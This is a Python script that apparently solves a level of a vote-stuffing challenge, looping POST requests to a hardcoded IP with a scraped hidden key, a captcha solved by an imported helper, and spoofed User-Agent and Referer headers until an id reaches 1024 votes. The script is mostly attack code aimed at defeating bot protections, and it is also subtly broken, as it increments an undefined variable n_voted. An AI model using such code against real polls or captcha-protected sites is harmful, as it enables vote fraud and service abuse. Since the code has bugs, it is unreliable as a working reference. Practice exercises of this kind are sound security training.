#!/usr/bin/python3
import requests
import sys

postRequest = __import__('postRequest').postRequest
getValue = __import__('getValue').getValue
getCurrentVotes = __import__('getCurrentVotes').getCurrentVotes
getRequest = __import__('getRequest').getRequest
getCaptcha = __import__('getCaptcha').getCaptcha


def main():

    id_number = 3
    required_votes = 1024
    myUrl = 'http://158.69.76.135/level3.php'
    current_votes = 0
    session = requests.Session()
    errors = 0
    count = 0

    while required_votes != current_votes:

        r = getRequest(session, myUrl)

        myReferer = r.url
        urlTextList = r.text.split()

        current_votes = getCurrentVotes(urlTextList, id_number)

        if current_votes is None:
            current_votes = 0
        elif current_votes >= required_votes:
            print("Contratulations id {} has {} votes!"
                  .format(id_number, required_votes))
            sys.exit()

        my_key = getValue(urlTextList)

        myCaptcha = getCaptcha(session, 'http://158.69.76.135/captcha.php')

        payload = {
            'id': id_number,
            'key': my_key,
            'captcha': myCaptcha,
            'holdthedoor': 'Submit'
        }

        myHeader = {
            'User-Agent': 'User-Agent: Mozilla/5.0 (Windows NT 6.1;\
WOW64; rv:18.0) Gecko/20100101 Firefox/18.0',
            'referer': myReferer
        }

        p = postRequest(session, myUrl, payload, myHeader)
        if "hacker!" in p.text:
            errors += 1
            count = count - errors
            continue

        if p.ok:  # ok catches all the status_code under 400 so return True
            n_voted += 1
            print("Required: {} | Errors {} | Voting--> {}\
                  ".format(required_votes, errors, n_voted),
                  end="\r", flush=True)
            p.connection.close()
        else:
            print("POST Error: {}".format(p.status_code))
            sys.exit(98)

    print("\nDone. You have voted {} times for the id {}."
          .format(count + 1, id_number))

if __name__ == '__main__':
    main()
